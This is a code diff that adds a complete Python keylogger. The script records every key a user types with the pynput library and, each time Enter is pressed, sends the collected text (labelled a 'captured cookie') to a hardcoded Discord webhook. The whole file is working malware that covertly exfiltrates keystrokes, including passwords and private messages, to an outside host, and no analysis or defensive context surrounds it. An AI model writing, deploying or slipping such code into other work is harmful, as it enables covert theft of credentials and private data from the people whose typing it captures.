@@ -1,0 +1,49 @@
+import pynput
+from pynput.keyboard import Key, Listener
+import requests
+import os
+
+# Global variables
+cookie = ""
+
+def on_press(key):
+    global cookie
+
+    if key == Key.enter:
+        print(f"Cookie: {cookie}")
+        send_to_discord(cookie)
+        cookie = ""
+
+    else:
+        try:
+            cookie += str(key.char)
+        except AttributeError:
+            pass
+
+def on_release(key):
+    if key == Key.esc:
+        # Stop listener
+        return False
+
+def send_to_discord(cookie):
+    url = "https://discord.com/api/webhooks/1492645719511797861/gF5zcg_YxBNqQJ1cEH8E0rDiljv7otR3qmjh1zr5ZIfkCnQVC7BBrocZG_NYhr0D19Bn"
+    headers = {
+        "Content-Type": "application/json"
+    }
+    data = {
+        "content": f"Captured Cookie: {cookie}"
+    }
+
+    try:
+        response = requests.post(url, json=data, headers=headers)
+        if response.status_code == 204:
+            print("Cookie sent successfully to Discord!")
+        else:
+            print(f"Failed to send cookie to Discord: {response.text}")
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending cookie to Discord: {e}")
+
+if __name__ == "__main__":
+    listener = Listener(on_press=on_press, on_release=on_release)
+    listener.start()
+    listener.join()
